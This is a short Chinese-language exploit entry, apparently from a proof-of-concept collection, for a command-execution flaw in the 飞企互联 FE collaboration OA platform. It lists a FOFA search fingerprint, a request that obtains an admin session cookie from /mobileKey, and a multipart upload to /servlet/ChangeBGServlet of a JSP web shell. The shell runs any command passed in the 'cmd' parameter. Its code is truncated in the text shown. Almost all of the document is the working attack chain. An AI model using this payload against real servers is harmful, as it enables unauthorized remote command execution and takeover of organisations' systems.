# 飞企互联OAFEworkChangeBGServlet存在命令执行漏洞

- **系统**：飞企互联　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app="FE-协作平台"`
- **请求**：`POST /mobileKey HTTP/1.1`

**请求体 / payload**
```
获取有效cookie
Host:
Content-Type: application/x-www-form-urlencoded
userName=admin
携带cookie上传文件
POST /servlet/ChangeBGServlet HTTP/1.1
Host:
Cookie:
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKNt0t4vBe8cX9rZk
------WebKitFormBoundaryKNt0t4vBe8cX9rZk
Content-Disposition: form-data; name="file"; filename="test.jsp"
Content-Type: text/plain
<% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("</pre>");new ja…（脚本共 740 字，完整版见原文）
```
- **预期**：200　|　—